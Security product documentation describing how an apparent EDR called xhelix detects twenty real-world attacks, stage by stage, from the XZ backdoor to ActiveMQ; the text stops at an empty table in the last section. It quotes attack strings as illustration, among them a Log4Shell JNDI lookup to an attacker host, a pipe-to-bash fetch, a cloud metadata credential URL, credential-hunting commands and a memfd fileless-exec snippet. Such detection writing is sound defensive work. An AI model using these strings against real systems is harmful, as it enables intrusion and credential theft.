# How xhelix handles top real-world attacks

Concrete, scenario-driven walkthroughs of the attack classes xhelix is built for. Each section names a real-world incident or attack family, traces the attack stage-by-stage, says what standard EDRs miss, and shows the exact xhelix components that catch each stage.

Detection rules referenced are bundled in `ruleset/core/*.yaml` and `ruleset/correlator/*.yaml` and shipped in the deb.

---

## 1. XZ Utils backdoor (CVE-2024-3094, March 2024)

**Real incident.** A malicious maintainer slipped a backdoor into the `xz-utils` library. On affected distros, sshd was linked against the backdoored `liblzma`. The backdoor activated only when the running binary was sshd, was launched by systemd, and was matched by signature — making it nearly undetectable by signature-based scanners.

The payload allowed remote code execution via crafted SSH connection arguments.

**Attack flow:**

1. Backdoored `liblzma` ships in distro update
2. sshd is restarted (apt upgrade / reboot)
3. Attacker connects with crafted SSH probe; backdoor selects + executes
4. Process spawned by sshd runs attacker code
5. Attacker pivots — credential theft, lateral move, persistence

**Why signature EDR misses it:**
- The compromised library is signed by the distro
- IOC / hash blocklists have nothing on a brand-new supply-chain artifact
- The exec lineage looks like legitimate sshd → child process

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/source` | New `SystemdUnit` anchor minted on sshd restart |
| 3 | `pkg/brp/runtime.go` | sshd's signed BRP profile lists allowed children (root login shells, sftp-server, internal-sftp). The attacker's spawned process is **not** in `AllowedChildren`. |
| 3 | rule | `brp.hard_deny` Class 1 |
| 4 | `pkg/correlator` | Child process trying to read `~/.ssh/authorized_keys`, `/etc/shadow`, AWS creds → secret-taint state machine flips `clean → secret_touched` |
| 5 | `pkg/egressguard` | sshd-spawned process trying to egress to attacker's C2 → 6-path decision returns `EgressDeny` (protected role + raw IP / non-declared peer) |

**Verdict:** xhelix catches this at stage 3 — `brp.hard_deny` Class 1 fires the moment sshd spawns an unexpected child. The backdoor's signature trick (validate the running binary is sshd) is the exact same mechanism xhelix uses for role identification, but xhelix flips the polarity: instead of "I am sshd, activate," xhelix asks "is this child in sshd's signed allowed-list?"

---

## 2. SolarWinds Orion / Sunburst (December 2020)

**Real incident.** Compromised SolarWinds Orion software update injected a backdoor into thousands of corporate networks. The malicious DLL was signed with a valid SolarWinds certificate.

**Attack flow on a Linux build/CI host:**

1. SolarWinds update mechanism downloads + installs malicious package
2. Backdoored binary launched as a system service
3. After dormant period (12+ days), backdoor activates and connects to attacker DNS
4. Attacker uses backdoor for reconnaissance + lateral move
5. Specific high-value targets get second-stage tools deployed

**Why signature EDR misses it:**
- Binary is signed by legitimate vendor
- Update mechanism is allowlisted
- 12-day dormancy defeats short-window behavioral baselines
- DNS C2 looks like legitimate vendor telemetry

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/pkgmgr` (Phase K.2 planned) | Package install window tagged; legitimate update path |
| 2 | `pkg/imagecache` | SHA-256 fingerprint stored at first run; future binary swap = drift |
| 3 | `pkg/beacon` | Periodic callback detection — even slow beacons get caught by Phase H.2 long-window correlation (5-7d planned) |
| 3 | `pkg/dnsexfil` | DNS C2 with high label entropy → `dns_exfil.detected` |
| 4 | `pkg/secrettaint` | Backdoor reads `~/.aws/credentials`, kube tokens → state flips |
| 4 | `pkg/correlator` | Reconnaissance commands (find, grep, lsof, ss) by a service that doesn't normally run them = chain anomaly |
| 5 | `pkg/egressguard` | Second-stage tool egress → undeclared peer → `EgressVerify` then `EgressDeny` |

**Verdict:** stages 1-2 are invisible by design (legitimate update path). xhelix is strong on stages 3-5. Phase H.2 long-window correlation (in the locked roadmap) is what closes the 12-day dormancy gap fully.

---

## 3. 3CX desktop app supply-chain (March 2023)

**Real incident.** 3CX's VoIP desktop app was trojanized via a compromised upstream library. The malicious code activated on specific hosts and connected to attacker C2.

**Why signature EDR misses it:** signed vendor binary, expected update channel, normal-looking C2 hostnames.

**How xhelix catches it on a Linux server running the 3CX-equivalent service:**

| Stage | Component | What fires |
|---|---|---|
| Activation | `pkg/brp/runtime.go` | The service's signed BRP profile lists declared outbound peers. Attacker C2 is not in `DeclaredPeers` / `UpstreamHosts`. |
| Outbound | `pkg/egressguard` | Profiled role + undeclared destination → `EgressVerify`. Verifier's `NetworkNovelty` domain weights the first-seen destination. |
| Outbound | `pkg/snicheck` | If outbound is to a raw IP with no SNI, that alone is a Class 3 signal. |
| Payload exec | `pkg/brp/runtime.go` | Tmpfs exec by profiled role → L0 invariant `brp.hard_deny` Class 1 |

**Verdict:** xhelix doesn't try to detect the trojanized library. It detects that the trojanized library does things that **xhelix's signed contract for that role does not permit**. Same defense applies to any future supply-chain compromise of a signed vendor binary.

---

## 4. Log4Shell exploitation chain (CVE-2021-44228, Dec 2021)

**Real incident.** Java applications using Log4j 2.x were exploitable via crafted JNDI lookups in any logged user input. Attackers caused vulnerable apps to fetch + execute arbitrary code.

**Attack flow on a Linux app server:**

1. Attacker sends HTTP request with `${jndi:ldap://attacker/Exploit}` in a logged field
2. Vulnerable Java app makes outbound LDAP/DNS request to attacker
3. App fetches and deserializes attacker-controlled class
4. JVM executes attacker payload — typically spawns a shell or drops a binary
5. Attacker establishes persistence + exfil

**Why signature EDR misses it:**
- The exploit string is just data in a log
- Java is allowlisted to run
- Outbound LDAP looks like normal directory traffic
- Spawned shell is from a trusted parent (the JVM)

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/egressguard` | The Java service's BRP profile declares legitimate outbound peers (database, internal API). Attacker LDAP/DNS = undeclared → `EgressVerify` → `EgressDeny` in enforce mode. |
| 4 | `pkg/brp/runtime.go` | JVM spawning `/bin/sh` is not in the Java service's `AllowedChildren` → `brp.hard_deny` Class 1 |
| 4 | rule | `shell_with_socket_fd` if the shell inherits the JVM's open socket |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` chain: outbound (step 0) → exec from /tmp (step 1) |
| 5 | `pkg/secrettaint` | Spawned process reads `/etc/passwd` or env secrets → state flips |
| 5 | `pkg/incidentgraph` | All of the above correlate under one source anchor with `intent=c2` and MITRE `T1059.004` + `T1071` |

**Verdict:** Log4Shell is **textbook for xhelix**. Multiple Class 1 + Class 2 alerts fire on a single exploitation. The signed BRP profile turns "JVM spawning shell" from a soft anomaly into a hard contract violation.

---

## 5. MOVEit zero-day mass exploit (CL0P, May-June 2023)

**Real incident.** CL0P ransomware group exploited a zero-day SQL injection in MOVEit Transfer to mass-deploy a webshell, dump customer data, and exfiltrate.

**Attack flow:**

1. SQLi against MOVEit's web frontend
2. Drop `human2.aspx` (or equivalent) webshell
3. Webshell runs OS commands via the web app's process
4. Enumerate + dump the MOVEit database
5. Exfiltrate to attacker-controlled S3 / SFTP

**Why signature EDR misses it:**
- Zero-day — no signature
- Webshell file looks like a legitimate app file by extension
- Database read is the web app's normal job
- Exfil destination might be a major cloud provider (S3) that's broadly allowlisted

**How xhelix catches it (assume Linux equivalent of MOVEit):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/fim` | File write to webroot path that's not in BRP profile's `FileWrites` allowlist → `fim.drift` |
| 2 | `pkg/assetclass` | Webroot path tagged `AssetWebDocRoot` → write is high-asset |
| 3 | `pkg/brp/runtime.go` | Web app spawning OS shell → `brp.hard_deny` Class 1 (web role's `AllowedChildren` doesn't include shells) |
| 3 | rule | `web_spawns_shell` + `shell_with_socket_fd` |
| 4 | `pkg/secrettaint` | Database read by spawned shell → secret-taint flips |
| 5 | `pkg/egressguard` | Outbound to attacker S3 / SFTP → undeclared peer for the web role → `EgressDeny` |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` + bulk file read pattern → incident with `intent=theft` |

**Verdict:** even without the zero-day signature, the **post-exploitation behaviors** all violate the web role's signed contract. xhelix doesn't need to know about MOVEit specifically — it needs to know what the web role is allowed to do, and refuses anything else.

---

## 6. Capital One AWS metadata SSRF (2019)

**Real incident.** Misconfigured WAF allowed SSRF against AWS Instance Metadata Service (IMDS). Attacker retrieved IAM role credentials from `169.254.169.254`, then used those credentials to download 100M+ customer records from S3.

**Attack flow:**

1. SSRF in WAF/proxy
2. WAF/proxy process fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Attacker extracts temporary AWS access key + secret + session token
4. Attacker uses creds to call S3 list/get APIs from external IP
5. Mass data download

**Why signature EDR misses it:**
- IMDS request is just an HTTP call
- AWS API calls from the attacker side happen off-host
- The compromised process is legitimate and signed

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | rule | `metadata.access_by_unexpected` Class 1 hard invariant — the WAF/proxy is not a cloud-aware role, so IMDS access fires hard_deny |
| 2 | rule | `metadata_svc_unexpected` Class 3 backup detector |
| 2 | `pkg/secrettaint` | The IMDS read transitions the lineage to `secret_touched` with `SecretCloudCreds` class |
| 3 | `pkg/secrettaint` | If the same lineage later writes the creds to disk or exfils, state escalates to `outbound_restricted` |
| 3 | `pkg/egressguard` | The metadata IP exclusion fix (2026-05-26 audit) ensures `169.254.169.254` is **not** treated as benign loopback/private — it's the most sensitive endpoint on the host |

**Verdict:** Class 1 `brp.hard_deny`-equivalent fires the moment the WAF hits IMDS. The Capital One incident is one of the canonical examples xhelix is built to prevent. The metadata-IP-as-private-bypass was specifically fixed during Phase C.3 soak.

---

## 7. Cortex-c2 implant family (open-source modern C2)

**Real public project.** Polling Python implant; uses TCP for C2 transport, an SSH brute-force plugin, plugin-on-demand fetch-and-exec, and a Telegram fallback channel. Designed to be operationally noisy.

**Attack flow:**

1. Implant agent (`main.py`) launched as long-lived Python process
2. 20-second poll to TCP database for tasking
3. Attacker tasks a command — Python passes it to a C wrapper, which `popen()`s it
4. Plugin staging: HTTP fetch → write → chmod +x → exec from `on_demand_plugins/`
5. Persistence: write `startup.sh` + nohup to detach
6. Lateral SSH brute-force plugin (`lateral_movement/main.go`)
7. Telegram fallback C2

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/brp` | The host's role profile (e.g. nginx-rp, mysql, app-server) doesn't list long-lived Python with TCP polling as a child. |
| 2 | `pkg/beacon` | 20-second polling cadence with small fixed payloads → `beacon.detected` |
| 3 | `pkg/brp/runtime.go` | Python → C wrapper → shell exec chain. Python is not in the host role's `AllowedChildren` (unless explicitly allowed). |
| 4 | `pkg/correlator` | **`dropped_binary_lifecycle`** chain (Phase J.2) fires on net_connect → exec from plugin dir |
| 5 | `pkg/fim` + `pkg/persistencewatch` | `startup.sh` write to persistence path → `fim.drift` + `persistence_chain` |
| 6 | `pkg/sshbrute` | Sliding-window counter on outbound SSH failures from this host as the attacker → `ssh_bruteforce` Class 2 |
| 7 | `pkg/egressguard` | Telegram API endpoint is in `AssetMessagingPlatform` (Phase J.3 — planned). Profiled server roles default-deny this class. |
| All | `pkg/incidentgraph` | Single incident accretes all alerts under one source anchor with `intent=c2`, MITRE `[T1071, T1059.004, T1105, T1098]` |

**Verdict:** cortex-c2 is operationally noisy and xhelix catches it at 6+ independent stages. We ran the analysis end-to-end and Phase J.2 (`dropped_binary_lifecycle`) was added specifically to make this kill chain one named correlator alert.

---

## 8. TeamTNT / Megalodon cryptominer dropper

**Real attack families.** Container-targeted cryptominer droppers that scan hosts, dump creds, deploy XMRig, and persist.

**Attack flow:**

1. Initial access — exposed Docker socket / weak SSH / Kubernetes misconfig
2. Reconnaissance — `find / -name "credentials"`, grep for AWS keys, SSH keys, kube tokens
3. Drop XMRig binary or use memfd-execve to run from memory
4. Reach out to mining pool
5. Drop systemd timer or cron for persistence
6. Scan internal subnets, spread

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/burstdet` | `file_read_burst` — hundreds of file_open events in seconds by one PID → Class 2 |
| 2 | `pkg/secrettaint` | Reading `~/.aws/credentials`, kube tokens → multi-class taint accumulation |
| 3 | rule | `memfd_run_pattern` Class 3 (or `binary_runs_from_tmp` if disk-based) |
| 3 | rule | `mem_mprotect_rwx` if XMRig mprotects pages RWX |
| 4 | `pkg/egressguard` | Mining pool address is undeclared → `EgressDeny` |
| 4 | `pkg/dnsexfil` / `pkg/beacon` | Mining stratum protocol has very predictable cadence |
| 5 | `pkg/fim` | Systemd timer / cron writes → `cron_new_unit` + `fim.drift` |
| 6 | `pkg/sshbrute` (Phase J.1) | Internal SSH brute attempts as the attacker spreads |

**Verdict:** the credential-scan burst at stage 2 is what xhelix's `file_read_burst` detector was built for — Megalodon-class scanning of hundreds of secret paths is a clean Class 2 signal long before any actual exfil.

---

## 9. SSH brute-force + key implantation (Mirai-style)

**Common attack pattern.** Mass scanning of public SSH ports, brute-force against weak credentials, persist via `authorized_keys` injection.

**Attack flow:**

1. Attacker scans public IPv4 for port 22
2. Brute-forces credentials on weak accounts
3. Logs in with stolen creds
4. Appends attacker pubkey to `~/.ssh/authorized_keys`
5. Downloads + runs second-stage payload (Mirai bot, miner, etc.)

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/sshbrute` (Phase J.1) | N failed auths from same source IP in M-second window → `ssh_bruteforce` Class 2 with users + counts |
| 3 | `pkg/source` | New `SSHAccept` source anchor minted for the successful login |
| 4 | `pkg/fim` | Write to `/root/.ssh/authorized_keys` → `ssh_key_added_root` Class 3 (canonical persistence detector) |
| 4 | `pkg/assetclass` | The path tagged `AssetSSHKey` → verifier weights heavily |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` chain on fetch + exec |

**Verdict:** stage 2 is now caught by Phase J.1 (shipped). Stage 4 has always been caught by `ssh_key_added_root`. Phase J.1 specifically closes the "we saw the auth fail but couldn't accumulate" gap.

---

## 10. Container escape via privileged mount (CVE-2019-5736 class)

**Real attack class.** Container running with `CAP_SYS_ADMIN` or `--privileged` mounts the host filesystem, then modifies host-side files (e.g., systemd units) to gain code execution on the host.

**Attack flow:**

1. Attacker compromises an app inside a container
2. Container has unsafe capabilities (CAP_SYS_ADMIN, CAP_DAC_READ_SEARCH, or `--privileged`)
3. Attacker mounts host root or `/proc/self/exe` overwrite
4. Writes a malicious systemd unit OR replaces a host binary
5. Wait for systemd to launch the unit → code runs on host

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/capwatch` | `cap.gained` Class 3 when capabilities are observed |
| 3 | `pkg/contescape` | `contescape.detected` — mount of host fs from inside a container, or pivot_root abuse |
| 3 | rule | `container_escape_privileged` from `ruleset/core/advanced.yaml` |
| 4 | `pkg/fim` | Write to `/etc/systemd/system/*.service` from a container-class cgroup → high-asset write |
| 4 | `pkg/persistencewatch` | Categorises the write as systemd persistence |
| 5 | `pkg/source` | New `SystemdUnit` anchor for the (malicious) unit start |

**Verdict:** stage 3 is the canonical Class 1/2 signal. xhelix combines the capset observation + cgroup classification + mount/pivot_root signal in one named rule. Phase G.3 landlock (planned, 2d) adds defense-in-depth at stage 4 by restricting which paths the daemon's own response engine can write to.

---

## 11. Memory implant / fileless malware (BPF or memfd-execve)

**Modern attack pattern.** Implant never touches disk. Uses `memfd_create` to allocate an anonymous executable, writes the payload into it, `execveat()`'s it. Or uses BPF programs as the implant body.

**Attack flow:**

1. Initial compromise (web RCE, SSH brute, supply chain — any of the above)
2. Allocate memfd: `int fd = memfd_create("payload", MFD_CLOEXEC)`
3. Write payload bytes to fd
4. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` — payload runs from memory
5. Payload also loads BPF programs to hide its presence and tamper with eBPF observers

**Why signature EDR misses it:**
- No file on disk to scan
- No path to look up
- Process exists but its `path` in /proc/PID/exe points to `/memfd:...`

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2-3 | `pkg/ebpf` | `memfd_create` syscall observed; `from_memfd=true` tag |
| 4 | rule | `memfd_run_pattern` Class 3 — exec of a /memfd:* path |
| 4 | rule | `mem_mprotect_rwx` if the payload mprotects pages RWX |
| 5 | rule | `bpf_syscall_unexpected` Class 3 if the implant loads BPF programs from a context that's not allowed |
| 5 | `pkg/tamperguard` | Attempts to disable xhelix's BPF programs → `tamper_*` Class 1 |

**Verdict:** fileless implants are one of xhelix's strongest cases. The eBPF-instrumented `execveat` + `from_memfd` tag means there's no place for fileless to hide. Combined with `mem_mprotect_rwx` and `bpf_syscall_unexpected`, the implant trips multiple detectors before it can do useful work.

---

## 12. PAM module replacement (sudo backdoor)

**Real attack pattern.** Attacker with root replaces a PAM module (`pam_unix.so`, `pam_systemd.so`) with a trojanized version that logs passwords or accepts a magic password. Used by sophisticated post-exploit toolkits.

**Attack flow:**

1. Initial root access (chain from any of the above)
2. Backup legitimate PAM module
3. Drop trojanized PAM module to `/lib/x86_64-linux-gnu/security/`
4. On next login, every sudo password gets logged or magic password works

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/fim` | Write to `/lib/x86_64-linux-gnu/security/*.so` → `fim.drift` Class 3 |
| 3 | `pkg/assetclass` | Path tagged as system library; verifier weights heavily |
| 3 | rule | `pam_module_modified` Class 3 (specific detector) |
| 3 | `pkg/brp` | The writing process is not the package manager → no `pkg_install_window` tag → no FP suppression |
| 4 | `pkg/identity` | Next sudo invocation by an unusual user from an unusual source → identity event correlates with the PAM modification window |

**Verdict:** the modification itself is detected at stage 3. Even if the attacker is root, the write is signed-by-no-one and not inside a package install transaction. xhelix doesn't try to prevent root-with-creds from writing files — it makes sure those writes are visible, anchored, and chain-attributed.

---

---

## 13. event-stream / flatmap-stream npm supply chain (November 2018)

**Real incident.** The popular `event-stream` npm package gained a malicious sub-dependency `flatmap-stream` after a maintainer transfer. The payload activated only when running inside the Copay Bitcoin wallet build, exfiltrating private keys. Affected millions of weekly downloads via transitive dependency.

**Attack flow on a Linux build/dev host:**

1. `npm install` pulls `event-stream` (or any package that transitively depends on it)
2. Postinstall script triggers; malicious code unpacks a payload
3. Payload checks if running inside the target (Copay) — if yes, decrypts second stage
4. Second-stage reads wallet seed files / dumps env vars
5. Exfiltrates via outbound HTTPS to attacker-controlled host

**Why signature EDR misses it:**
- npm package signed by its maintainer
- Postinstall is a normal npm flow — allowlisted
- Targeting check means payload is dormant on non-target hosts
- Exfil to a clean domain looks like normal package telemetry

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/pkgmgr` (Phase K.2 planned) | `pkg_install_window=true` tag on npm child process events |
| 2 | `pkg/fim` | Write to `~/.npm/_cacache/` or `node_modules/*/...` outside the install transaction window → `fim.drift` |
| 2 | `pkg/source` | npm postinstall script anchors under the operator's sudo / shell session |
| 4 | `pkg/secrettaint` | Read of `~/.config/copay/`, `~/.bitcoin/`, env vars containing keys → state `clean → secret_touched` |
| 5 | `pkg/egressguard` | Build/dev host's BRP profile declares legitimate npm registry hosts. Attacker domain = undeclared peer → `EgressVerify` then `EgressDeny` in enforce |
| 5 | `pkg/correlator` | Chain: postinstall exec → file read in non-build paths → outbound to undeclared peer → Class 2 incident |

**MITRE:** `T1195.002` (Software Supply Chain Compromise), `T1552.001` (Credentials in Files), `T1041` (Exfiltration Over C2 Channel)

**Verdict:** Class 1/2 fires at stages 4 and 5. The targeting check (stage 3) is invisible by design, but the moment the payload reads wallet files or hits outbound, xhelix's secret-taint + egressguard chain trips.

---

## 14. ua-parser-js + coa + rc npm hijack (October-November 2021)

**Real incident.** Maintainer accounts for `ua-parser-js` (8M+ weekly downloads), `coa` (9M+), and `rc` (15M+) were hijacked. Malicious versions ran credential-theft scripts and dropped a Monero cryptominer (XMRig) on Linux + macOS hosts.

**Attack flow:**

1. `npm install` of a project depending on any of the three packages
2. Preinstall script (Linux/Mac branch) downloads `jsextension` binary
3. `jsextension` runs XMRig miner
4. Separately, `terminate.js` exfiltrates env variables + ssh keys to attacker C2

**Why signature EDR misses it:**
- Packages are signed by their (now-hijacked) maintainers
- Download URL looks like a CDN
- XMRig is sometimes legitimately deployed by ops teams

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/brp/runtime.go` | Build host's BRP profile doesn't list arbitrary curl/wget from npm child → `brp.verify_protected_path` |
| 2 | `pkg/correlator` | **`dropped_binary_lifecycle` (Phase J.2)**: outbound fetch (step 0) → write to `/tmp/jsextension` (off-path) → exec from `/tmp/` (step 1) → fires `dropped_binary_lifecycle` Class 3 |
| 3 | rule | `mem_mprotect_rwx` — XMRig mprotects pages RWX for the hashing inner loop |
| 3 | `pkg/egressguard` | Outbound to mining-pool `stratum+tcp://...` from undeclared peer → `EgressDeny` |
| 4 | `pkg/secrettaint` | Read of `~/.ssh/id_rsa` + env vars by the script → `SecretSSHPrivkey` taint |
| 4 | `pkg/correlator` | Read followed by outbound = exfil pattern Class 2 |

**MITRE:** `T1195.002`, `T1496` (Resource Hijacking), `T1552.001`, `T1041`

**Verdict:** xhelix's `dropped_binary_lifecycle` correlator chain was **literally built for this attack class** (cortex-c2 + this npm pattern share the same fetch-write-chmod-exec shape). Class 3 fires within ~30 seconds of the install.

---

## 15. PyTorch torchtriton typosquat (December 2022)

**Real incident.** A dependency-confusion-style attack on PyPI: `torchtriton` package was created on the public PyPI index, while PyTorch nightlies expected the internal `pytorch-triton`. Anyone running `pip install torch --pre` got the malicious `torchtriton`, which ran a binary that read `/etc/hosts`, `/etc/passwd`, env variables, and `~/.ssh/` and exfiltrated them.

**Attack flow:**

1. User runs `pip install --pre torch torchaudio torchvision` (nightly)
2. PyPI resolves `torchtriton` from the public index (attacker-controlled), not the internal one
3. The package contains `triton` binary that runs on import
4. Binary reads `/etc/hosts`, `/etc/passwd`, env vars, SSH keys, AWS creds
5. Exfiltrates to `*.h4ck.cfd` domain via DNS-encoded payload

**Why signature EDR misses it:**
- pip install is allowlisted
- The package was published correctly to public PyPI by the attacker
- DNS exfil looks like normal DNS resolution
- The PoC author claimed it was "research" — IOC feeds slow to flag

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/pkgmgr` (Phase K.2 planned) | pip child process in pkg_install_window |
| 3 | `pkg/brp/runtime.go` | Python's BRP profile (if installed) limits child execs; arbitrary `triton` binary is not in `AllowedChildren` |
| 4 | `pkg/secrettaint` | Read of `/etc/passwd`, `/etc/shadow`, `~/.ssh/id_rsa`, env → multi-class taint accumulation |
| 4 | `pkg/burstdet` | 50+ secret-file reads in seconds → `file_read_burst` Class 2 |
| 5 | `pkg/dnsexfil` | High-entropy subdomain queries to `*.h4ck.cfd` — label entropy + query rate → `dns_exfil.detected` Class 2 |
| 5 | `pkg/egressguard` | DNS to unfamiliar resolver IPs → undeclared peer |

**MITRE:** `T1195.002`, `T1552.001`, `T1071.004` (DNS C2)

**Verdict:** the credential-burst at stage 4 and DNS-exfil at stage 5 are both **Class 2 named detectors** in xhelix today. No signature needed.

---

## 16. Codecov bash uploader compromise (April 2021)

**Real incident.** Attackers gained access to Codecov's bash uploader script (used by 25,000+ orgs in CI/CD pipelines). Modified it to exfiltrate environment variables — which included CI/CD secrets, cloud credentials, signing keys, source code — to an attacker-controlled IP.

**Attack flow on a Linux CI runner:**

1. CI job runs `bash <(curl -s https://codecov.io/bash)` (or installs codecov-cli)
2. Modified bash script reads `printenv` — captures **all environment variables** of the build process
3. POSTs env data to `https://[attacker_ip]/upload/v2`
4. Attacker now has every secret in the CI environment

**Why signature EDR misses it:**
- Bash uploader is fetched from Codecov's legitimate domain
- printenv is a builtin — no exec to catch
- POST is to a single IP that might rotate

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/brp/runtime.go` | CI runner's BRP profile lists legitimate uploader hosts. Profile-IP mismatch on the destination = drift |
| 2 | `pkg/procscrape` | `getenv` / `/proc/self/environ` mass read by a curl-piped-to-bash lineage → `proc_scrape=environ` tag → `cred_proc_scrape=true` |
| 2 | `pkg/secrettaint` | Read of CI secret env vars → `SecretCICDToken` + `SecretCloudCreds` (depending on which env vars are present) — state `clean → secret_touched` |
| 3 | `pkg/egressguard` | curl→bash lineage with secret-taint promoted → outbound after secret-touch = `EgressDeny` (or shadow_deny in shadow mode) |
| 3 | rule | `metadata.access_by_unexpected` if env-read is followed by AWS API calls from CI runner |

**MITRE:** `T1195.001` (Compromise Software Dependencies and Development Tools), `T1552.001`, `T1567` (Exfil Over Web Service)

**Verdict:** stage 2 trips `cred_proc_scrape` + `secrettaint` promotion within milliseconds. The bash uploader reading every env var is exactly the procscrape detector's design intent. Phase N (broker mediation, planned ~10-15d) extends this: even if the CI process *can* read env, the broker only releases short-lived bound tokens, so what gets exfiltrated is useless after seconds.

---

## 17. Apache Struts / Equifax breach (CVE-2017-5638, March 2017)

**Real incident.** OGNL injection in the Jakarta Multipart parser of Apache Struts 2 allowed unauthenticated RCE via a crafted `Content-Type` header. Equifax's failure to patch led to 147M consumer records stolen.

**Attack flow on a Linux app server:**

1. Attacker sends HTTP request with crafted `Content-Type` containing OGNL payload
2. Vulnerable Struts parses + evaluates the OGNL expression
3. OGNL invokes `Runtime.exec()` to spawn a shell
4. Shell runs reconnaissance (whoami, uname, ip a)
5. Drops a webshell or reverse shell
6. Lateral movement + bulk data dump

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/brp/runtime.go` | Tomcat/JBoss BRP profile lists `AllowedChildren = [java, javaw, ...]`. `/bin/sh` not in the list → `brp.hard_deny` Class 1 |
| 3 | rule | `web_spawns_shell` Class 2 — JVM spawning shell is a hard chain anomaly |
| 4 | `pkg/correlator` | Recon commands by the spawned shell within seconds of the JVM-spawn event → chain alert |
| 5 | `pkg/fim` | Webshell drop to webroot path → `fim.drift` Class 3 + `AssetWebDocRoot` weighting |
| 5 | rule | `binary_runs_from_tmp` if attacker drops to `/tmp/` |
| 6 | `pkg/secrettaint` | Mass read of DB connection strings, JNDI configs → multi-class taint |
| 6 | `pkg/egressguard` | Bulk outbound to attacker host → `EgressDeny` |

**MITRE:** `T1190` (Exploit Public-Facing Application), `T1059.004`, `T1505.003` (Webshell), `T1041`

**Verdict:** stage 3 alone (`brp.hard_deny` on JVM-spawning-shell) is the **canonical xhelix protection against web-RCE-to-shell**. Equifax-class exfil is multi-stage but stops at stage 3 with a signed BRP profile in place.

---

## 18. Atlassian Confluence OGNL injection (CVE-2022-26134, June 2022)

**Real incident.** Unauthenticated OGNL injection in Confluence Server / Data Center via URL path. Mass-exploited in the wild within 24h of disclosure. Used for cryptominer drops, ransomware, and intelligence collection.

**Attack flow:**

1. Attacker sends `GET /%24%7B...OGNL_PAYLOAD...%7D/` to Confluence
2. OGNL evaluates → `Runtime.exec("bash -c '...'")`
3. Shell downloads a binary from C2
4. Binary writes systemd persistence + runs miner or stager
5. Optional: deploys ransomware

**How xhelix catches it (same Confluence service running under Linux):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/brp/runtime.go` | Confluence is a profiled web role; JVM spawning bash is not in `AllowedChildren` → `brp.hard_deny` Class 1 |
| 3 | `pkg/correlator` | **`dropped_binary_lifecycle` (Phase J.2)** chain: bash outbound (step 0) → exec from `/tmp/` (step 1) → fires Class 3 |
| 4 | `pkg/fim` + `pkg/persistencewatch` | systemd unit write → Class 2 (`fim.drift` + categorised as `CategorySystemdUnit`) |
| 4 | `pkg/source` | New `SystemdUnit` anchor minted for the malicious unit start |
| 4 | rule | `mem_mprotect_rwx` if miner is XMRig (and `cap.gained` if it sets up perf-event privileges) |
| 5 | `pkg/egressguard` | Bulk outbound to attacker infra → undeclared peer for Confluence role → `EgressDeny` |

**MITRE:** `T1190`, `T1059.004`, `T1053.005` (Scheduled Task: systemd timer), `T1496`

**Verdict:** **two independent Class 1 alerts** fire (`brp.hard_deny` at stage 2 + persistence drop at stage 4). The signed Confluence role profile is the line-of-defense.

---

## 19. Spring4Shell (CVE-2022-22965, March 2022)

**Real incident.** Class.Module.classLoader exposure in Spring Framework allowed remote code execution via crafted HTTP form parameters. Affected Java apps with specific JDK 9+ + Tomcat configurations.

**Attack flow:**

1. Attacker sends crafted form POST with parameter like `class.module.classLoader.resources.context.parent.pipeline.first.pattern`
2. Spring's PropertyAccessor binds the attacker-controlled value into the AccessLogValve config
3. Spring writes an attacker-controlled file to disk (`shell.jsp` in the webroot)
4. Attacker visits `/shell.jsp?cmd=...` and gets RCE

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/fim` | Write to webroot (`/var/www/`, `/opt/tomcat/webapps/`) from a non-package-manager process → `fim.drift` Class 3 + `AssetWebDocRoot` weighting |
| 3 | `pkg/brp/runtime.go` | Tomcat's BRP profile lists `FileWrites = [logs/, work/]`. Write to webapps/ path = path-not-in-FileWrites → `brp.verify_protected_path` |
| 4 | `pkg/brp/runtime.go` | When the JSP is then loaded + executed, Tomcat spawning a shell process trips `brp.hard_deny` |
| 4 | rule | `web_spawns_shell` Class 2 |
| 5 | `pkg/correlator` | Sequence: webroot write → web request → shell spawn within same lineage → Class 2 incident |

**MITRE:** `T1190`, `T1505.003`, `T1059.004`

**Verdict:** stage 3 is the **earliest detection point** — webroot writes by Tomcat lineage that aren't in `FileWrites` are inherently suspicious. Subsequent shell execution trips `brp.hard_deny`. **Two-stage redundancy** so a single missed signal still catches the chain.

---

## 20. Apache ActiveMQ RCE (CVE-2023-46604, October 2023)

**Real incident.** OpenWire protocol deserialization flaw in ActiveMQ allowed remote attackers to instantiate arbitrary classes. Used in the wild by HelloKitty ransomware affiliates within days of disclosure.

**Attack flow:**

1. Attacker sends crafted OpenWire payload to ActiveMQ (default port 61616)
2. ActiveMQ deserializes → instantiates `org.springframework.context.support.ClassPathXmlApplicationContext`
3. The malicious XML config fetches a script from attacker C2
4. Script downloads + runs a payload (Cobalt Strike, ransomware loader, or crypto miner)
5. Persistence + lateral move

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
